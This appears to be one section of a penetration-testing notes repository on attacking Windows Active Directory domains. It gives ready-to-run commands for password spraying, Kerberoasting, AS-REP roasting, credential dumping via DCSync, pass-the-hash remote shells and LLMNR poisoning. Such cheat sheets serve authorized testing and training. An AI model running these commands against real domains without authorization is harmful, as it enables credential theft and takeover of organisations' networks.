# 06 — Active Directory

Enumerate and attack Windows domains. Start with low-privilege domain credentials or a null session, map the attack graph, then pursue a path to Domain Admin.

## Contents
- [Windows Server AD Lab Setup](Windows-Server-AD-Lab-Setup.md) — build a practice domain (OUs, users) with PowerShell.
- Domain escalation paths (AD CS / RBCD, Kerberoasting, AS-REP roasting) are covered in the [Pentesting Field Guide](../Pentesting-Field-Guide.md).

---

## BloodHound — AD attack-path mapping
- **Purpose:** graph relationships (sessions, ACLs, group membership) to find the shortest path to high-value objects.
- **Install:** BloodHound Community Edition; collect data with `bloodhound-python`.
```bash
bloodhound-python -u user -p pass -d domain.local -ns 10.10.10.10 -c All --zip
```
**Flags:**
- `-u`/`-p` — domain credentials. `-d` — domain. `-ns` — the DC to query (name server).
- `-c All` — run all collection methods (sessions, ACLs, trusts, …). `--zip` — bundle the JSON for easy import.

---

## kerbrute — user enumeration and password spray
- **Install:** download the `kerbrute` binary from its releases page.
```bash
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Winter2026!'
```
- `userenum` — check which usernames exist (via Kerberos pre-auth, quiet). `passwordspray` — try one password against many users. `--dc` — domain controller. `-d` — domain.

---

## impacket — Python toolkit for AD/network protocols
- **Install:** `pipx install impacket`

| Task | Command | Key flags |
| --- | --- | --- |
| AS-REP roast | `impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat` | `-format hashcat` outputs a crackable hash; `-no-pass` for unauth |
| Kerberoast | `impacket-GetUserSPNs domain.local/user:pass -request` | `-request` fetches the TGS tickets for SPN accounts |
| Remote exec | `impacket-psexec domain.local/user:pass@10.10.10.50` | runs a SYSTEM shell via a service; `impacket-wmiexec` is stealthier |
| Dump secrets | `impacket-secretsdump domain.local/user:pass@10.10.10.50` | `-just-dc` pulls NTDS hashes from a DC (DCSync) |
| Pass-the-hash | `impacket-psexec -hashes :NTHASH user@10.10.10.50` | `-hashes LM:NT` authenticates with a hash, no password |

---

## evil-winrm — WinRM shell
- **Install:** `gem install evil-winrm`
```bash
evil-winrm -i 10.10.10.50 -u user -p pass
evil-winrm -i 10.10.10.50 -u user -H <NTHASH>
```
- `-i` — target IP. `-u` — user. `-p` — password, or `-H` — NT hash (pass-the-hash). `-s`/`-e` — scripts/executables directories for upload helpers.

---

## certipy — AD CS enumeration and abuse
- **Install:** `pipx install certipy-ad`
```bash
certipy find -u user@domain.local -p pass -dc-ip 10.10.10.10 -vulnerable -stdout
```
- `find` — enumerate certificate templates and CAs. `-vulnerable` — only show misconfigured (ESC1–ESC8) templates. `-dc-ip` — the DC. `-stdout` — print results.

---

## responder — LLMNR/NBT-NS poisoning (lab/authorized use)
- **Install:** `sudo apt install responder`
```bash
sudo responder -I eth0 -wF
```
- `-I eth0` — listen interface. `-w` — start the WPAD rogue proxy. `-F` — force NTLM auth on WPAD. Captures net-NTLM hashes to crack offline.

---

## netexec (nxc)
Central to AD credential validation and spraying — see [02-Enumeration](../02-Enumeration/README.md).
